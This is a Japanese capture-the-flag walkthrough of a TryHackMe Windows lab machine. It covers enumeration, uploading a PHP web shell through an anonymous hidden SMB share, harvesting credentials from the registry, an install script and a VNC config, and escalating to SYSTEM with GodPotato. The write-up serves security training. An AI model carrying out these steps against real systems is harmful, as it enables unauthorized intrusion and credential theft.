# AllSignsPoint2Pwnage CTF

https://tryhackme.com/room/allsignspoint2pwnage

## Enumeration

```shell
TARGET= 10.10.200.77
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT      STATE SERVICE       REASON
21/tcp    open  ftp           syn-ack ttl 125
80/tcp    open  http          syn-ack ttl 125
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
443/tcp   open  https         syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
5900/tcp  open  vnc           syn-ack ttl 125
49664/tcp open  unknown       syn-ack ttl 125
49665/tcp open  unknown       syn-ack ttl 125
49666/tcp open  unknown       syn-ack ttl 125
49667/tcp open  unknown       syn-ack ttl 125
49668/tcp open  unknown       syn-ack ttl 125
49675/tcp open  unknown       syn-ack ttl 125
49677/tcp open  unknown       syn-ack ttl 125
```

FTP/anonymous でテキストファイル取得。

```sh
$ cat ./notice.txt   
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```

### dirsearch

```sh
dirsearch --url http://$TARGET 

[15:54:26] 500 -  636B  - /cgi-bin/printenv.pl                              
[15:54:31] 200 -  165B  - /content.php                                      
[15:54:34] 301 -  341B  - /dashboard  ->  http://10.10.200.77/dashboard/    
[15:54:35] 200 -    7KB - /dashboard/                                       
[15:54:35] 200 -    6KB - /dashboard/howto.html
[15:54:35] 200 -   31KB - /dashboard/faq.html                               
[15:54:36] 200 -   78KB - /dashboard/phpinfo.php                            
[15:54:42] 200 -   30KB - /favicon.ico                                      
[15:54:43] 503 -  402B  - /examples                                         
[15:54:43] 503 -  402B  - /examples/
[15:54:43] 503 -  402B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[15:54:43] 503 -  402B  - /examples/servlets/index.html                     
[15:54:43] 503 -  402B  - /examples/servlets/servlet/CookieExample
[15:54:43] 503 -  402B  - /examples/jsp/index.html
[15:54:43] 503 -  402B  - /examples/jsp/snp/snoop.jsp
[15:54:43] 503 -  402B  - /examples/servlet/SnoopServlet
[15:54:43] 503 -  402B  - /examples/servlets/servlet/RequestHeaderExample   
[15:54:43] 503 -  402B  - /examples/websocket/index.xhtml
[15:54:50] 200 -    2KB - /images/                                          
[15:54:50] 301 -  338B  - /images  ->  http://10.10.200.77/images/          
[15:54:50] 301 -  335B  - /img  ->  http://10.10.200.77/img/                
[15:55:42] 200 -  779B  - /Webalizer/                                       
[15:55:45] 200 -  771B  - /xampp/
```

/dashboard　を表示すると、`Welcome to XAMPP for Windows 7.4.11` の表示

### SMB


```sh
$ smbclient -L \\$TARGET -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        images$         Disk      
        Installs$       Disk      
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.200.77 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

images$ が隠し共有。

```sh
$ smbclient '\\10.10.200.77\images$' -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Wed Jan 27 03:19:19 2021
  ..                                  D        0  Wed Jan 27 03:19:19 2021
  internet-1028794_1920.jpg           A   134193  Mon Jan 11 06:52:24 2021
  man-1459246_1280.png                A   363259  Mon Jan 11 06:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Mon Jan 11 06:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Mon Jan 11 06:53:59 2021
```

リバースシェルphpをアップロード。  
https://www.revshells.com/ の P0wny Shell が唯一機能した。

```sh
smb: \> put powny.php
```

```sh
sign@DESKTOP-997GG7D:C:\Users\sign\Desktop# type user_flag.txt
thm{.....................................................}
```

msfvenomでmeterpreter昇格したかったが、実行時エラーで断念。  
以降はすべてP0wny Shell上で実行。

レジストリにユーザーパスワードが入っていた。

```sh
sign@DESKTOP-997GG7D:C:\xampp\htdocs\images# reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Installsフォルダに管理者パスワードが残っていた。

```sh
sign@DESKTOP-997GG7D:C:\Installs# type Install_www_and_deploy.bat
@echo off
REM Shop Sign Install Script
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p [REDACTED] xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

VNC設定にパスワードハッシュが残っていた。

```sh
sign@DESKTOP-997GG7D:C:\Installs# type ultravnc.ini
[ultravnc]
passwd=[REDACTED]
passwd2=5AB2CDC0BADCAF13F1
[admin]
UseRegistry=0
SendExtraMouse=1
Secure=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=0
Avilog=0
path=C:\Program Files\uvnc bvba\UltraVNC
accept_reject_mesg=
DebugLevel=0
DisableTrayIcon=0
rdpmode=0
noscreensaver=0
...
```

http://aluigi.altervista.org/pwdrec.htm のツールを使ってVNCパスワードを復元できた。

```sh
$ wine ./vncpwd.exe [REDACTED]
```

SeChangeNotifyPrivilege がついている。

```sh
sign@DESKTOP-997GG7D:C:\xampp\htdocs\images# whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

[GodPotato](https://github.com/BeichenDream/GodPotato) を使って、フルパス指定でAdminフラグを読む。

```sh
sign@DESKTOP-997GG7D:C:\xampp\htdocs\images# GodPotato-NET4.exe -cmd "cmd /c type c:\Users\Administrator\Desktop\admin_flag.txt"
[*] CombaseModule: 0x140716791562240
[*] DispatchTable: 0x140716793904848
[*] UseProtseqFunction: 0x140716793274224
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5c0fd712-7289-4e21-9c56-cf66789371b8\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002402-0344-ffff-8370-972ea23725d6
[*] DCOM obj OXID: 0xa914c2b238c4e1f4
[*] DCOM obj OID: 0xb155b1f25f24850f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1004 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4868
thm{..................................................}
```

## 振り返り

- いつものリバースシェルが機能しなかったので不便で疲れた。
- あまり真新しいことはなかったが、レジストリにパスワードが保存されている場合があることは覚えておきたい。
